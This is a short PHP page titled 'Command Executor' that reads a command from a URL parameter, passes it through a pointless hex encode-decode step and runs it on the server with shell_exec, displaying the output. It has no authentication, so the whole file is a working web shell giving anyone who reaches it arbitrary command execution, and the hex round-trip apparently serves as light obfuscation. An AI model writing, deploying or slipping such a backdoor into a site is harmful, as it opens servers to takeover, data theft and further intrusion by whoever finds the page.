<?php
// Function to convert plain text command to hex
function textToHex($text)
{
    return bin2hex($text);
}

// Function to execute the hex-encoded command
function executeHexCommand($hexCommand)
{
    $command = hex2bin($hexCommand);

    if ($command !== false) {
        // Execute the command and capture the output
        $output = shell_exec($command);
        if ($output === null) {
            echo "Command execution failed or returned no output.";
        } else {
            echo "<pre>" . htmlspecialchars($output) . "</pre>";
        }
    } else {
        echo "Invalid hex-encoded command.";
    }
}

// Check if a plain text command is provided via GET
if (isset($_GET['cmd'])) {
    $plainCommand = $_GET['cmd'];
    $hexCommand = textToHex($plainCommand);
    executeHexCommand($hexCommand);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Command Executor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 2rem;
        }
        form {
            margin-top: 1rem;
        }
    </style>
</head>
<body>
    <h1>Command Executor with Auto Hex Conversion</h1>
    <form method="GET">
        <label for="cmd">Enter command:</label><br>
        <input type="text" name="cmd" id="cmd" placeholder="e.g., ls" required><br><br>
        <input type="submit" value="Execute">
    </form>
</body>
</html>
